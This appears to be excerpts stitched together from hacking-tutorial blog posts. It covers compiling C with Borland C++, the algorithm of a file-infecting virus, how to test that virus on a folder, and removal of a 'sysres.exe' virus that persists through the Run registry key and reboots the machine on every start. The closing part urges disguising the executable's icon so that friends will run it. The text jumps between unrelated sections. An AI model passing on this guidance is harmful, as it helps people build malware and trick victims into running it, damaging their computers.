C++5.51.exe. The default installation path would be:
C:\Borland\BCC55
How to configure Borland C++ compiler?
Here is a step-by-step instruction on how to configure the compiler:
After you install Borland C++ compier, create two new Text Documents.
Open the first New Text Document.txt file and add the following two lines into it:
-I"c:\Borland\Bcc55\include"
-L"c:\Borland\Bcc55\lib"
Save changes and close the file. Now rename the file from New Text Document.txt to bcc32.cfg.
Open the second New Text Document (2).txt file and add the following line into it:
-L"c:\Borland\Bcc55\lib"
Save changes and close the file. Rename the file from New Text Document (2).txt to ilink32.cfg.
Now copy the two files bcc32.cfg and ilink32.cfg, navigate to C:\Borland\BCC55\Bin and paste them.
How to Compile the C Source Code (.C files)?
Here is a detailed instruction on how to compile C source codes:
You need to place the .C (example.c) file to be compiled in the following location:
C:\Borland\BCC55\Bin
Now go to the command prompt (Start->Run->type cmd->Enter)
Make the following path as the present working directory (use the CD command):
C:\Borland\BCC55\Bin
To compile the file (example.c) use the following command:
bcc32 example.c
Now if there exists no error in the source code, you’ll get a compiled executable module (example.exe) in the same location (C:\Borland\BCC55\Bin).
Now you have successfully compiled the source code into an executable file(.exe file).

Step-1: Search for files in the current directory. If one or more file is present, load the first file (target file).
Step-2: Load the copy of the virus itself onto the memory.
Step-3: Open the target file. Copy the virus code from the memory and place it in the target file. Close the target file when the copying process is completed.
Step-4: Load the next file to infect and move to the step-3. If all the files are infected, close all the open files, unload them from the memory and exit.
As far as the technical terms are concerned, I would not be able to explain the program line by line. Anyone with a working knowledge of C should be easily able to understand the functions and other terms used in the program.
How to Compile the Program:
For a step-by-step guide, you can refer my detailed post on how to compile C programs?
How to Test the Virus After the Compilation:
Create a new empty folder.
Put some executable files (or any other files) in the folder.
Run the PC_Virus.exe file. With in a few seconds all the other files in the folder gets infected.

Reboot your computer in the safe mode.
Go to:
%systemroot%\Windows\System
(%systemroot% can be C,D,E or F)
You will find a file by name sysres.exe, delete it.
Type regedit in run. You will go to the registry editor. Here navigate to:
HKEY_CURRENT_USER\Software\Microsoft\Windows\ CurrentVersion\Run
There, on the right site you will see an entry by name “sres“. Delete this entry. That’s it. You have now removed this virus successfully.
Logic Behind the working of this virus program:
If I do not explain the logic(Algorithm) behind the working of the virus program, I think this post would become an incomplete one. So I’ll explain the logic in a simplified manner without getting much into the technical aspects of the program. If you have further doubts, you can pass your comments.
LOGIC:
First the virus will find the Root partition (Partition on which Windows is installed).
Next, it will determine whether or not the virus file (sysres.exe) is already copied into %systemroot% -> Windows -> System.
If not it will just place a copy of itself into %systemroot% -> Windows -> System and makes a registry entry to put this virus file into the Windows startup.
Or else if the virus is already found in the %systemroot% -> Windows -> System directory (folder), then it just gives a command to restart the computer.
This process is repeated every time the PC is restarted.
NOTE: The system will not be restarted as soon as you double click the Sysres.exe file.The restarting process will occur from the next boot of the system.
How to change the icon of the executable module (This step is optional):
After you compile, the sysres.exe file that you get will have a default icon. If you send this file to your friends they may not execute it since it has a default ICON. So it is possible to change the ICON of this Sysres.exe file into any other ICON that is more trusted and looks attractive.
